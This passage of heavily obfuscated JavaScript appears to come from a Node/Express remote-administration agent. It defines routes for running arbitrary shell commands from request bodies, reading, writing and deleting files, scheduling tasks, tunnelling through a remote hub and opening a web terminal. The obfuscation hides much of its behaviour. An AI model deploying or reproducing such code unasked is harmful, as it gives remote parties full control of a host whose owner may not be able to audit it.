            'zozOF': function (c, d) {
                return c === d;
            },
            'ncjLN': function (c, d) {
                return c === d;
            },
            'ipsIp': function (c, d) {
                return c === d;
            },
            'raEyI': nV(0x365),
            'EwdjO': function (c, d) {
                return c(d);
            },
            'Mvefz': function (c, d) {
                return c === d;
            },
            'fLAqV': function (c, d) {
                return c === d;
            },
            'wiHQG': 'port\x20is\x20required\x20and\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'cjJLI': function (c, d) {
                return c === d;
            },
            'nOTHQ': function (c, d) {
                return c === d;
            },
            'ULUrQ': function (c, d) {
                return c < d;
            },
            'tjSvX': function (c, d) {
                return c ?? d;
            },
            'bRRBJ': function (c, d) {
                return c === d;
            },
            'DZrRL': function (c, d) {
                return c === d;
            },
            'ySELk': function (c, d) {
                return c === d;
            },
            'ZKJac': function (c, d) {
                return c === d;
            },
            'VTAjA': function (c, d) {
                return c === d;
            },
            'JbNvp': function (c, d) {
                return c(d);
            },
            'GOAPC': function (c, d) {
                return c === d;
            },
            'wJVgp': function (c, d) {
                return c === d;
            },
            'zQXpH': function (c, d) {
                return c === d;
            },
            'Pougb': nV(0xb44),
            'llDYr': nV(0x909),
            'QbZWb': nV(0x368),
            'vtYEX': nV(0x7b3),
            'NKGYl': function (c, d) {
                return c === d;
            },
            'EXvxa': nV(0x36c),
            'EBNoJ': function (c, d) {
                return c === d;
            },
            'udher': function (c, d) {
                return c === d;
            },
            'eZKUx': nV(0xf9f),
            'qNtXV': function (c, d) {
                return c(d);
            },
            'vvTPF': nV(0x6e9),
            'OZrtI': nV(0xab7),
            'eHfZw': nV(0xeb6),
            'xScjZ': nV(0x251),
            'kPskQ': nV(0x945),
            'AQlWO': nV(0xc43),
            'luQTS': nV(0x6e6),
            'sewOw': nV(0x20a),
            'AXHXb': nV(0x2e6),
            'IbBvq': 'Initializing\x20TempKeyManager...',
            'tTLtn': nV(0x995),
            'myKZY': nV(0xfa2),
            'zjenL': function (c) {
                return c();
            },
            'lNGeV': nV(0x1017),
            'UAMUn': nV(0x419),
            'Grcbc': function (c, d, f) {
                return c(d, f);
            },
            'sfcqW': '/api/baseinfo',
            'bLrEE': nV(0x6c1),
            'mTjzn': nV(0x1021),
            'FhKqw': '/api/exec',
            'agBdd': nV(0xa42),
            'SuKnx': nV(0x74b),
            'RATTP': nV(0x4f6),
            'dEytx': '/api/file',
            'yrSdi': nV(0xe22),
            'Okbde': nV(0x4f5),
            'HsMoQ': nV(0x4a3),
            'eFqDM': '/api/file/new',
            'MTMRe': nV(0x2ad),
            'FNpKy': nV(0xeaa),
            'ENMZe': '/api/task/onetime',
            'KBmFN': nV(0xf7c),
            'jwNmZ': nV(0x470),
            'LDohm': '/api/task/log/onetime',
            'aJjoa': nV(0xc45),
            'zBmZp': nV(0x9b1),
            'Selha': function (c, d) {
                return c === d;
            },
            'cKDEy': '[KMODE3]\x20⚠️\x20KHUB\x20未设置,\x20KMODE=3\x20未生效\x20(本地服务照常)',
            'AiEkt': nV(0x499),
            'kYsMb': nV(0xfc7),
            'kSVxn': nV(0xa40),
            'ptEnb': nV(0x4d6),
            'XSaYY': '/api/proxy/config',
            'chAse': nV(0x864),
            'Ytbkp': nV(0xffe),
            'COORV': nV(0xaea),
            'zANMU': nV(0x305),
            'EZkOg': nV(0x739),
            'EzDNu': 'Setting\x20up\x20WebSocket\x20terminal\x20route...',
            'InaaO': '/api/ws/*',
            'FkrWw': nV(0xda6),
            'fRCut': 'SIGINT',
            'yhTss': 'Fatal\x20error\x20in\x20main():'
        };
    try {
        await a0d4(), a0R['debug'](b[nV(0xf51)]), a0aE[nV(0xfca)](a), a0R[nV(0xac2)](b['kPskQ']), a0aE[nV(0x416)](), a0R[nV(0xac2)](nV(0xf5b)), a0R['debug'](b[nV(0x74c)]);
        const c = new a0aM(a0aE[nV(0xd70)], a0aE[nV(0x433)]);
        a0R[nV(0xac2)](b[nV(0xa38)]);
        !a0aE['DEBUG'] && !c[nV(0x49f)] && (a0R[nV(0xfcc)](b[nV(0x179)]), a0R['error'](b['AXHXb']), process['exit'](0x1));
        a0R[nV(0xac2)](b[nV(0xc41)]);
        const d = new a0aL();
        d[nV(0x661)] = () => a0aE[nV(0x587)](), a0R['debug']('TempKeyManager\x20initialized'), a0R[nV(0xac2)](b['tTLtn']);
        const f = new a0aP();
        a0R[nV(0xac2)](nV(0xda1)), a0R['debug'](b['myKZY']);
        const g = b[nV(0xfe5)](a0f);
        b[nV(0x6a2)](a0x, g), a0R[nV(0xac2)](nV(0x1fb)), g['use']((r, s, t) => {
            const nW = nV, u = b['AUdki']['split']('|');
            let v = 0x0;
            while (!![]) {
                switch (u[v++]) {
                case '0':
                    b[nW(0x695)](t);
                    continue;
                case '1':
                    s[nW(0x1e8)](b[nW(0x593)], b['vmaGR']);
                    continue;
                case '2':
                    s[nW(0x1e8)](b[nW(0xa53)], b[nW(0x25c)]);
                    continue;
                case '3':
                    if (b[nW(0x3f7)](r['method'], b[nW(0x7d5)])) {
                        if (r[nW(0x4fa)][nW(0x1ba)](nW(0x936)) && !r[nW(0x57f)][b[nW(0xcad)]])
                            return t();
                        return a0aE['DEBUG'] && s[nW(0x42d)](nW(0x635), b[nW(0xaf4)]), s[nW(0x13d)](0xc8)[nW(0xdc9)]();
                    }
                    continue;
                case '4':
                    s['header'](b[nW(0xd9a)], b[nW(0x98d)]);
                    continue;
                case '5':
                    s[nW(0x1e8)](b[nW(0x9c7)], '*');
                    continue;
                }
                break;
            }
        }), g[nV(0xfef)](b['lNGeV'], (r, s, t) => {
            const nX = nV;
            if (b[nX(0x3f7)](r[nX(0x4fa)], nX(0xa43)) || r[nX(0x4fa)]['startsWith'](b['ClsOe']))
                return t();
            a0f[nX(0x2a5)]({
                'type': () => !![],
                'limit': Math[nX(0x37f)](0x1, a0aE['KISAMA_HUB_MAX_BODY'])
            })(r, s, t);
        }), g['use'](b[nV(0xbc6)], (r, s, t, u) => {
            const nY = nV;
            if (r && (b['btHIO'](r[nY(0xa49)], b[nY(0x142)]) || r[nY(0x13d)] === 0x19d))
                return t['status'](0x19d)[nY(0xb56)]({
                    'status': nY(0xfcc),
                    'code': b[nY(0x4ec)],
                    'message': '请求体超过\x20KISAMA_HUB_MAX_BODY\x20('[nY(0x83f)](a0aE[nY(0x968)], '\x20字节)')
                });
            b['ftbEi'](u, r);
        }), g['use'](a0f[nV(0x5b4)]({
            'type': r => r[nV(0x4fa)] !== '/api/fileraw',
            'limit': b[nV(0xc5a)]
        })), g[nV(0xfef)](a0f[nV(0x3c0)]({ 'extended': !![] })), g['use'](b[nV(0xed9)](a0aO, c, d)), a0R['debug']('Middleware\x20applied,\x20setting\x20up\x20routes...'), g[nV(0xb12)](b['sfcqW'], async (r, s) => {
            const nZ = nV;
            try {
                const t = await a0aE[nZ(0xab1)](), u = await a0aE[nZ(0x78b)](t[nZ(0x1f0)] || ''), v = await a0aE[nZ(0xd75)](), w = a0aP['assembleBaseInfo'](t, u, v);
                b[nZ(0x3f7)](r[nZ(0xfbb)], !![]) ? (w[nZ(0x29f)] = a0aE[nZ(0xbd2)], w['noise_key'] = a0aE[nZ(0x5e3)]) : (w[nZ(0x29f)] = null, w['noise_key'] = null), s[nZ(0xb56)](w), b[nZ(0x3f7)](a0aE[nZ(0x17d)], '1') && a0cT['onBaseinfoSuccess']();
            } catch (x) {
                s[nZ(0x13d)](0x1f4)[nZ(0xb56)]({
                    'status': b[nZ(0xbd8)],
                    'message': x[nZ(0x769)]
                });
            }
        }), g['get'](b[nV(0x64c)], (r, s) => {
            const o0 = nV;
            let t = a0aE[o0(0x920)];
            if (b[o0(0x5b3)](r[o0(0x842)]['ttl'], undefined)) {
                const y = parseInt(r[o0(0x842)]['ttl'], 0xa);
                if (Number['isNaN'](y) || b[o0(0x8b4)](y, 0x1) || y > a0aE['TEMPKEY_MAX_TTL_HOURS'])
                    return s[o0(0x13d)](0x1a6)['json']({ 'error': o0(0x628)[o0(0x83f)](a0aE[o0(0x151)]) });
                t = y;
            }
            const u = b[o0(0x540)](typeof r['query'][o0(0xdfd)], o0(0xba0)) ? r[o0(0x842)][o0(0xdfd)]['trim']()[o0(0x544)]() : '';
            let v;
            if (b[o0(0x540)](u, '') || b[o0(0x540)](u, b[o0(0x644)]))
                v = b[o0(0x644)];
            else {
                if (b['MzVfK'](u, b[o0(0x767)]))
                    v = b[o0(0x767)];
                else
                    return s['status'](0x1a6)['json']({ 'error': b[o0(0x29b)] });
            }
            const w = d[o0(0xa70)](t), x = z => new Date(z * 0x3e8)[o0(0xc78)]()[o0(0x8d4)](o0(0xd7c), 'Z');
            s[o0(0xb56)]({
                'status': 'ok',
                'key_id': w[o0(0x8b9)],
                'ttl_seconds': w['ttl_seconds'],
                'created_at': x(w[o0(0x1d8)]),
                'expires_at': x(w['expires_at']),
                'ecdsa': b['wLUZZ'](v, b[o0(0x767)]) ? {
                    'private_key': w[o0(0x1b2)],
                    'public_key': w[o0(0x5a5)]
                } : {
                    'private_key': w[o0(0x71b)]['trim'](),
                    'public_key': w['ecdsa_public_key'][o0(0x5b0)]()
                },
                'ecies': b['MzVfK'](v, o0(0x219)) ? {
                    'private_key': w[o0(0xb8a)],
                    'public_key': w[o0(0x6d6)]
                } : {
                    'private_key': w[o0(0xb8a)],
                    'public_key': w[o0(0xb52)]
                }
            });
        }), g['get'](b[nV(0x3ea)], async (r, s) => {
            const o2 = nV, t = {
                    'hyKEQ': b['epqnb'],
                    'pkSSO': function (u, v) {
                        const o1 = a0b;
                        return b[o1(0x87f)](u, v);
                    }
                };
            try {
                const u = Math[o2(0x568)](Date[o2(0x8da)]() / 0x3e8);
                !a0aE[o2(0xaa4)] || b[o2(0xd80)](b[o2(0x380)](u, a0aE['_status_cache_time']), a0aE[o2(0xbbf)]) ? (!a0aE[o2(0xbe1)] && (a0aE[o2(0xbe1)] = f['getRealtimeInfo']()[o2(0xdcb)](w => {
                    const o3 = o2, x = t['hyKEQ'][o3(0xa6a)]('|');
                    let y = 0x0;
                    while (!![]) {
                        switch (x[y++]) {
                        case '0':
                            a0aE[o3(0xbe1)] = null;
                            continue;
                        case '1':
                            return w;
                        case '2':
                            a0aE['_status_cache_time'] = Math[o3(0x568)](t[o3(0x40c)](Date[o3(0x8da)](), 0x3e8));
                            continue;
                        case '3':
                            a0R[o3(0xac2)](o3(0x877));
                            continue;
                        case '4':
                            a0aE[o3(0xaa4)] = w;
                            continue;
                        }
                        break;
                    }
                })[o2(0x92f)](w => {
                    const o4 = o2;
                    a0aE[o4(0xbe1)] = null;
                    throw w;
                })), await a0aE[o2(0xbe1)]) : a0R[o2(0xac2)](b[o2(0xe82)]);
                const v = { ...a0aE[o2(0xaa4)] };
                s['json'](v);
            } catch (w) {
                s['status'](0x1f4)[o2(0xb56)]({
                    'status': b[o2(0xbd8)],
                    'message': w[o2(0x769)]
                });
            }
        });
        const h = async (r, s) => {
            const o5 = nV;
            try {
                let t = null;
                if (b[o5(0xeb2)](typeof r[o5(0x344)], b[o5(0xdda)]))
                    t = r[o5(0x344)][o5(0x5b0)]();
                else
                    r[o5(0x344)] && typeof r[o5(0x344)] === o5(0xfe9) && (t = r[o5(0x344)][o5(0x817)] || '');
                if (!t)
                    return s[o5(0x13d)](0x190)[o5(0xb56)]({
                        'status': b[o5(0xbd8)],
                        'message': b['pdXhn']
                    });
                const u = await a0aQ['execute'](t, {
                    'cwd': r['body'][o5(0x1075)],
                    'env': r[o5(0x344)][o5(0xe6a)],
                    'timeout': a0aE[o5(0xd5c)]
                });
                s[o5(0xb56)](u);
            } catch (v) {
                s[o5(0x13d)](0x1f4)['json']({
                    'status': b[o5(0xbd8)],
                    'message': v[o5(0x769)]
                });
            }
        };
        g[nV(0x257)](b[nV(0x83a)], h);
        for (const r of [
                '/api/do',
                nV(0x7d9),
                nV(0x966)
            ]) {
            g[nV(0x257)](r, h);
        }
        g[nV(0x257)](b[nV(0x9df)], async (s, t) => {
            const o6 = nV;
            try {
                const u = await a0aV[o6(0xf61)](s[o6(0x344)][o6(0x4fa)], s[o6(0x344)]['recursive']);
                t['json']({
                    'status': 'ok',
                    'count': u[o6(0xc54)],
                    'files': u
                });
            } catch (v) {
                t[o6(0x13d)](0x1f4)['json']({
                    'status': b['JXrue'],
                    'message': v[o6(0x769)]
                });
            }
        }), g[nV(0x257)](b['SuKnx'], async (s, t) => {
            const o7 = nV;
            try {
                const u = await a0aV[o7(0x46b)](s[o7(0x344)][o7(0x60d)] || []);
                t[o7(0xb56)]({
                    'status': 'ok',
                    'files': u
                });
            } catch (v) {
                t[o7(0x13d)](0x1f4)[o7(0xb56)]({
                    'status': o7(0xfcc),
                    'message': v[o7(0x769)]
                });
            }
        }), g[nV(0x3e9)](b['SuKnx'], async (s, t) => {
            const o8 = nV;
            try {
                const u = s[o8(0x344)][o8(0x6df)] || {}, v = b[o8(0xeb2)](s[o8(0x344)][o8(0x902)], !![]), w = await a0aV[o8(0xa2c)](u, v);
                t[o8(0xb56)](w);
            } catch (x) {
                t['status'](0x1f4)[o8(0xb56)]({
                    'status': b[o8(0xbd8)],
                    'message': x[o8(0x769)]
                });
            }
        }), g[nV(0x257)](b['RATTP'], async (s, t) => {
            const o9 = nV;
            try {
                const u = await a0aV[o9(0xa0a)](s[o9(0x344)][o9(0x4fa)]);
                t[o9(0xb56)](u);
            } catch (v) {
                t['status'](0x1f4)['json']({
                    'status': b[o9(0xbd8)],
                    'message': v[o9(0x769)]
                });
            }
        }), g[nV(0x257)](b[nV(0x1ae)], async (s, t) => {
            const oa = nV;
            try {
                const u = await a0aV['uploadFile'](s[oa(0x344)]['path'], s[oa(0x344)][oa(0xbfe)], s['body'][oa(0xb47)], s[oa(0x344)][oa(0xb89)], s['body'][oa(0x6f8)]);
                t['json'](u);
            } catch (v) {
                t[oa(0x13d)](0x1f4)['json']({
                    'status': 'error',
                    'message': v[oa(0x769)],
                    'reason': b[oa(0xc2e)](a0aT, v)
                });
            }
        }), g['post'](b[nV(0xa59)], a0f[nV(0x2a5)]({
            'type': b[nV(0x66f)],
            'limit': b[nV(0xc5a)]
        }), async (s, t) => {
            const ob = nV;
            try {
                const u = b[ob(0xa58)](decodeURIComponent, s[ob(0x57f)][b[ob(0x104c)]] || ''), v = b['uJSsC'](decodeURIComponent, s[ob(0x57f)][ob(0xdde)] || ''), w = s[ob(0x57f)][b[ob(0x938)]], x = s['headers'][b[ob(0x1b0)]];
                if (!u || !v)
                    return t[ob(0x13d)](0x190)['json']({
                        'status': b['JXrue'],
                        'completed': ![],
                        'message': b[ob(0x6d9)],
                        'reason': ob(0x2de)
                    });
                const y = b[ob(0x5b3)](w, undefined) ? parseInt(String(w), 0xa) : null, z = b[ob(0x377)](x, undefined) ? b[ob(0x753)](parseInt, b[ob(0x2d0)](String, x), 0xa) : null, A = s[ob(0x344)];
                if (!Buffer['isBuffer'](A))
                    return t[ob(0x13d)](0x190)[ob(0xb56)]({
                        'status': b[ob(0xbd8)],
                        'completed': ![],
                        'message': ob(0x799),
                        'reason': ob(0x2de)
                    });
                const B = await a0aV[ob(0x2d7)](u, v, A, y, z);
                t[ob(0xb56)](B);
            } catch (C) {
                t[ob(0x13d)](0x1f4)[ob(0xb56)]({
                    'status': b['JXrue'],
                    'completed': ![],
                    'message': C['message'],
                    'reason': a0aT(C)
                });
            }
        }), g[nV(0x257)](b['Okbde'], async (s, t) => {
            const oc = nV;
            try {
                const u = await a0aV[oc(0x539)](s['body'][oc(0x4fa)]);
                t[oc(0x42d)](b[oc(0x812)], u[oc(0x885)][oc(0x43a)]()), t[oc(0x42d)](b['dyHwp'], u[oc(0x4fa)]), t[oc(0x42d)](oc(0x374), b[oc(0x66f)]);
                if (!a0aE['DEBUG'] && s['header'](b[oc(0x102d)]) === '1' && a0aE[oc(0xfda)] > 0x0 && b[oc(0x18a)](u['size'], a0aE['DOWNLOAD_ENCRYPT_MAX']))
                    try {
                        const v = c[oc(0xdc6)](u[oc(0xb47)], Buffer[oc(0xca5)](a0aE[oc(0xbd2)], b[oc(0x1a4)]));
                        return t[oc(0x42d)](b['TXffO'], oc(0xf0e)), t[oc(0x871)](v);
                    } catch (w) {
                        return t[oc(0x13d)](0x1f4)[oc(0xb56)]({
                            'status': b['JXrue'],
                            'message': b[oc(0xfa9)]
                        });
                    }
                return t[oc(0x871)](u[oc(0xb47)]);
            } catch (x) {
                t['status'](0x1f4)['json']({
                    'status': b[oc(0xbd8)],
                    'message': x[oc(0x769)]
                });
            }
        }), g[nV(0x350)](b[nV(0x1ae)], async (s, t) => {
            const od = nV;
            try {
                let u = s[od(0x344)][od(0x60d)];
                if (!u || !Array[od(0xedd)](u)) {
                    u = [];
                    if (s[od(0x344)]['path'])
                        u['push'](s[od(0x344)][od(0x4fa)]);
                    if (s[od(0x344)][od(0xb2d)])
                        u['push'](s[od(0x344)][od(0xb2d)]);
                }
                const v = await a0aV[od(0x998)](u);
                t[od(0xb56)]({
                    'status': 'ok',
                    'results': v
                });
            } catch (w) {
                t[od(0x13d)](0x1f4)[od(0xb56)]({
                    'status': b[od(0xbd8)],
                    'message': w[od(0x769)]
                });
            }
        }), g[nV(0x3e9)](b[nV(0x1ae)], async (s, t) => {
            const oe = nV;
            try {
                const u = s[oe(0x344)] || {}, v = await a0aV[oe(0x145)](u[oe(0x679)] || u);
                t[oe(0xb56)](a0aV[oe(0x393)](v));
            } catch (w) {
                t[oe(0x13d)](0x1f4)['json']({
                    'status': b[oe(0xbd8)],
                    'message': w[oe(0x769)],
                    'reason': b[oe(0x2d0)](a0aT, w)
                });
            }
        }), g[nV(0x257)](b['HsMoQ'], async (s, t) => {
            const of = nV;
            try {
                const u = await a0aV['copyFiles'](s[of(0x344)] || {});
                t[of(0xb56)](a0aV[of(0x393)](u));
            } catch (v) {
                t[of(0x13d)](0x1f4)[of(0xb56)]({
                    'status': b[of(0xbd8)],
                    'message': v[of(0x769)],
                    'reason': b[of(0x963)](a0aT, v)
                });
            }
        }), g[nV(0x257)](b[nV(0x3d7)], async (s, t) => {
            const og = nV;
            try {
                const u = await a0aV[og(0xea8)](s[og(0x344)][og(0x4fa)]);
                t[og(0xb56)](u);
            } catch (v) {
                t['status'](0x1f4)[og(0xb56)]({
                    'status': b[og(0xbd8)],
                    'message': v[og(0x769)],
                    'reason': a0aT(v)
                });
            }
        }), g['post'](b[nV(0xd13)], async (s, t) => {
            const oh = nV;
            try {
                const u = s[oh(0x344)] || {};
                if (!u[oh(0x4fa)])
                    return t[oh(0x13d)](0x190)[oh(0xb56)]({
                        'error': b[oh(0x175)],
                        'reason': b[oh(0xe26)]
                    });
                if (!Array[oh(0xedd)](u[oh(0x75b)]) || u[oh(0x75b)][oh(0xc54)] === 0x0)
                    return t['status'](0x190)[oh(0xb56)]({
                        'error': b[oh(0x88b)],
                        'reason': b[oh(0xe26)]
                    });
                const v = await a0aV[oh(0xdc3)](u[oh(0x4fa)], u[oh(0x75b)], !!u[oh(0xcdd)]);
                t[oh(0xb56)](v);
            } catch (w) {
                t[oh(0x13d)](w['status'] || 0x1f4)[oh(0xb56)]({
                    'status': b['JXrue'],
                    'error': w[oh(0x769)],
                    'message': w[oh(0x769)],
                    'reason': w['reason'] || b['ynIZx'](a0aT, w)
                });
            }
        }), g[nV(0x257)](b[nV(0x292)], async (s, t) => {
            const oi = nV;
            try {
                const u = s[oi(0x344)] || {};
                if (!u[oi(0x4fa)])
                    return t[oi(0x13d)](0x190)['json']({
                        'error': b[oi(0x175)],
                        'reason': 'unknown'
                    });
                const v = await a0aV['unzipArchive'](u[oi(0x4fa)], u[oi(0xaab)], b[oi(0xf89)](u[oi(0x228)], ![]), Array[oi(0xedd)](u[oi(0x77e)]) ? u[oi(0x77e)] : null);
                t[oi(0xb56)](v);
            } catch (w) {
                t[oi(0x13d)](w[oi(0x13d)] || 0x1f4)[oi(0xb56)]({
                    'status': b['JXrue'],
                    'error': w[oi(0x769)],
                    'message': w[oi(0x769)],
                    'reason': w[oi(0xe61)] || a0aT(w)
                });
            }
        }), g[nV(0xb12)](nV(0x91c), (s, t) => {
            const oj = nV;
            t['json'](a0aX[oj(0x5cc)]());
        }), g[nV(0x257)](b[nV(0xb3c)], async (s, t) => {
            const ol = nV;
            try {
                const u = await a0aX['setOnetimeTasks'](s[ol(0x344)]);
                t[ol(0xb56)](u);
            } catch (v) {
                t[ol(0x13d)](v[ol(0x13d)] || 0x1f4)[ol(0xb56)]({
                    'status': b[ol(0xbd8)],
                    'message': v[ol(0x769)]
                });
            }
        }), g['get'](nV(0xf7c), (s, t) => {
            const om = nV;
            t[om(0xb56)](a0aX[om(0x845)]());
        }), g[nV(0x257)](b[nV(0x4fc)], (s, t) => {
            const on = nV;
            try {
                const u = a0aX[on(0x182)](s[on(0x344)]);
                t[on(0xb56)](u);
            } catch (v) {
                t['status'](0x1f4)[on(0xb56)]({
                    'status': b[on(0xbd8)],
                    'message': v[on(0x769)]
                });
            }
        }), g[nV(0xb12)](b[nV(0xc73)], (s, t) => {
            const oo = nV;
            t['json'](a0aX[oo(0x554)]());
        }), g[nV(0xb12)](b[nV(0x431)], (s, t) => {
            const op = nV;
            let u = b[op(0x385)](parseInt, s[op(0x842)][op(0xeff)], 0xa) || 0x32;
            u = Math[op(0x100f)](Math[op(0x37f)](u, 0x1), 0x64), t[op(0xb56)](a0aX[op(0x4c1)](u));
        }), g['get']('/api/task/log/cron', (s, t) => {
            const oq = nV;
            let u = b['jlewX'](parseInt, s['query'][oq(0xeff)], 0xa) || 0x32;
            u = Math['min'](Math[oq(0x37f)](u, 0x1), 0x64), t['json'](a0aX[oq(0xc06)](u));
        }), g[nV(0x350)](nV(0xbf3), (s, t) => {
            const or = nV;
            t['json'](a0aX[or(0x3ff)]());
        }), g[nV(0x350)](b['aJjoa'], (s, t) => {
            const ot = nV;
            t['json'](a0aX[ot(0xa01)]());
        }), g[nV(0xb12)](b[nV(0x86e)], (s, t) => {
            const ou = nV;
            t[ou(0xb56)](a0aX[ou(0xa86)]());
        }), g[nV(0x257)](nV(0x655), async (s, t) => {
            const ov = nV;
            try {
                const u = await a0aX['executeOnetimeTasks']();
                t[ov(0xb56)](u);
            } catch (v) {
                t[ov(0x13d)](0x1f4)['json']({
                    'status': b[ov(0xbd8)],
                    'message': v[ov(0x769)]
                });
            }
        });
        const i = {
                'debug': (...s) => a0R[nV(0xac2)](s['join']('\x20')),
                'info': (...s) => a0R[nV(0x543)](s[nV(0xd9d)]('\x20')),
                'warning': (...s) => a0R[nV(0x585)](s[nV(0xd9d)]('\x20'))
            }, j = new a0cO(i), k = new a0cS(i), l = [];
        let m = null;
        if (b[nV(0x6f2)](a0aE[nV(0x17d)], '3')) {
            const s = a0a7(a0aE[nV(0x70d)]);
            if (!a0aE['KHUB'])
                a0R[nV(0x585)](b[nV(0xeec)]);
            else {
                if (s)
                    a0R['warn'](nV(0xd38)[nV(0x83f)](s, nV(0x781)));
                else {
                    !a0aE[nV(0x1d0)][nV(0xc54)] && a0R[nV(0x543)](b[nV(0x169)]);
                    const t = new a0cQ(a0aE['KHUB'], a0aE[nV(0x70d)], a0aE[nV(0x563)], a0aE[nV(0x1d0)], i, b['kYsMb']);
                    k[nV(0x75b)][nV(0x42d)](a0aE[nV(0x70d)][nV(0x5b0)]()[nV(0x544)](), t), m = t;
                }
            }
        }
        const n = () => {
            const ow = nV;
            return a0aW['saveHubregs'](k['list']()['map'](u => ({
                'hub': u[ow(0x73d)],
                'kname': u[ow(0xebe)],
                'ports': u['ports']
            })));
        };
        g[nV(0xb12)](b[nV(0xece)], (u, v) => {
            const ox = nV, w = j[ox(0x932)]();
            v[ox(0xb56)]({
                'status': 'ok',
                'count': w[ox(0xc54)],
                'tunnels': w
            });
        }), g[nV(0xb12)](b[nV(0x162)], (u, v) => {
            const oy = nV, w = k[oy(0x932)]();
            if (!m && b[oy(0x7cc)](w['length'], 0x0))
                return v[oy(0xb56)]({
                    'status': 'ok',
                    'enabled': ![],
                    'message': b[oy(0xda0)]
                });
            v[oy(0xb56)]({
                'status': 'ok',
                'enabled': b[oy(0x9fd)](w[oy(0xc54)], 0x0),
                'tunnel': m ? m[oy(0x86c)]() : null,
                'registrations': w
            });
        }), g[nV(0x257)](b[nV(0x162)], async (u, v) => {
            const oz = nV, w = b[oz(0x20b)](a0cN, u[oz(0x344)]) || {}, x = a0aw(w[oz(0x73d)]);
            if (!/^https?:\/\//i[oz(0xf92)](x))
                return v['status'](0x1a6)['json']({
                    'status': oz(0xfcc),
                    'code': oz(0xa06),
                    'message': 'hub\x20必须以\x20http://\x20或\x20https://\x20开头'
                });
            const y = Array[oz(0xedd)](w[oz(0xfea)]) ? w['ports'][oz(0x595)](D => Number['isInteger'](D) && D >= 0x1 && D <= 0xffff) : [], {
                    snapshot: z,
                    code: A,
                    message: B
                } = await k['register'](x, String(w[oz(0xebe)] || ''), y, 'dynamic', 0x3a98);
            (b['VydwS'](A, null) || b[oz(0xd68)](A, b[oz(0xeef)])) && (y[oz(0xc54)] && (b['lRFtE'](a0am, a0ad, y), a0aW[oz(0x6bf)](b[oz(0xe92)](a0ai))));
            if (A === null) {
                const D = b['ciSTS'](n);
                return v[oz(0xb56)]({
                    'status': 'ok',
                    'persisted': D,
                    'registration': z
                });
            }
            if (b['MzVfK'](A, b[oz(0xeef)])) {
                const E = b[oz(0x695)](n);
                return v[oz(0x13d)](0x1f4)[oz(0xb56)]({
                    'status': b[oz(0xbd8)],
                    'persisted': E,
                    'code': A,
                    'message': B,
                    'registration': z
                });
            }
            const C = b[oz(0x7cc)](A, oz(0xd69)) || b[oz(0x1c9)](A, b[oz(0x644)]) ? 0x199 : 0x1a6;
            v[oz(0x13d)](C)[oz(0xb56)]({
                'status': b[oz(0xbd8)],
                'persisted': ![],
                'code': A,
                'message': B,
                'registration': z
            });
        }), g[nV(0x350)]('/api/hub', (u, v) => {
            const oA = nV, w = b[oA(0x6a2)](a0cN, u[oA(0x344)]) || {}, x = b[oA(0xc3d)](String, w[oA(0xebe)] || ''), y = k[oA(0x5c9)](x);
            if (!y)
                return v[oA(0x13d)](0x194)[oA(0xb56)]({
                    'status': oA(0xfcc),
                    'message': oA(0x816)[oA(0x83f)](x, oA(0xaf2))
                });
            const z = b['bCywg'](n);
            v[oA(0xb56)]({
                'status': 'ok',
                'persisted': z,
                'removed': y
            });
        }), g[nV(0xb12)](b['XSaYY'], (u, v) => {
            const oB = nV, w = a0aW[oB(0xc3e)];
            v[oB(0xb56)]({
                'status': 'ok',
                'hub': {
                    'env_ports': [...new Set(a0aE[oB(0x1d0)] || [])][oB(0xcd4)]((x, y) => x - y),
                    'runtime_ports': b['yDoLL'](a0ah, a0ad),
                    'effective_ports': b['cglSC'](a0aj, a0ad)
                },
                'local': {
                    'env_ports': [...new Set(a0aE[oB(0x3f5)] || [])][oB(0xcd4)]((x, y) => x - y),
                    'runtime_ports': b[oB(0x354)](a0ah, a0ae),
                    'effective_ports': a0aj(a0ae)
                },
                'kstore_enabled': !!(w && w[oB(0x105c)] && !w[oB(0x96f)])
            });
        }), g[nV(0x257)](b[nV(0x9af)], (u, v) => {
            const oC = nV, w = b[oC(0xc12)](a0cN, u[oC(0x344)]) || {}, x = w[oC(0xd5f)] || a0ae;
            if (b[oC(0xf89)](x, a0ad) && b[oC(0xc81)](x, a0ae))
                return v[oC(0x13d)](0x1a6)['json']({
                    'status': b[oC(0xbd8)],
                    'code': b[oC(0x621)],
                    'message': oC(0x279)
                });
            if (!Array[oC(0xedd)](w[oC(0xfea)]))
                return v[oC(0x13d)](0x1a6)[oC(0xb56)]({
                    'status': b[oC(0xbd8)],
                    'code': b['eeuhH'],
                    'message': b[oC(0x211)]
                });
            b[oC(0x753)](a0al, x, w['ports']);
            const y = a0aW[oC(0x6bf)](b['FVWov'](a0ai));
            v[oC(0xb56)]({
                'status': 'ok',
                'persisted': y,
                'scope': x,
                'runtime_ports': b[oC(0x1f3)](a0ah, x),
                'effective_ports': a0aj(x)
            });
        }), g[nV(0x350)](b[nV(0x9af)], (u, v) => {
            const oD = nV, w = u[oD(0x842)]['scope'] || '';
            if (w && b[oD(0xf89)](w, a0ad) && b['Moxdb'](w, a0ae))
                return v[oD(0x13d)](0x1a6)[oD(0xb56)]({
                    'status': b['JXrue'],
                    'code': b[oD(0x621)],
                    'message': oD(0x279)
                });
            for (const y of w ? [w] : [
                    a0ad,
                    a0ae
                ]) {
                b[oD(0x1068)](a0al, y, []);
            }
            const x = a0aW[oD(0x6bf)](b[oD(0xdb9)](a0ai));
            v[oD(0xb56)]({
                'status': 'ok',
                'persisted': x,
                'scope': b[oD(0x806)](w, b[oD(0x340)]),
                'hub': {
                    'runtime_ports': b[oD(0x963)](a0ah, a0ad),
                    'effective_ports': a0aj(a0ad)
                },
                'local': {
                    'runtime_ports': b[oD(0x75f)](a0ah, a0ae),
                    'effective_ports': b[oD(0xe56)](a0aj, a0ae)
                }
            });
        });
        const o = async (u, v) => {
            const oE = nV, w = parseInt(u[oE(0x528)]['port'], 0xa);
            if (!Number[oE(0x63f)](w) || w < 0x1 || b[oE(0xe7d)](w, 0xffff))
                return v['status'](0x194)[oE(0xb56)]({
                    'status': b['JXrue'],
                    'code': oE(0x8fa),
                    'message': oE(0x7a6)[oE(0x83f)](u[oE(0x528)]['port'])
                });
            const x = { ...u[oE(0x57f)] };
            for (const C of a0ac)
                delete x[C];
            const y = u['socket'] && u[oE(0x102e)][oE(0x48e)] || '';
            let z, A, B;
            try {
                const D = b[oE(0x1f3)](a0ar, {
                    'port': w,
                    'whitelist': b['yDoLL'](a0aj, a0ae),
                    'method': u[oE(0x174)],
                    'path': '/' + (u[oE(0x528)][0x0] || ''),
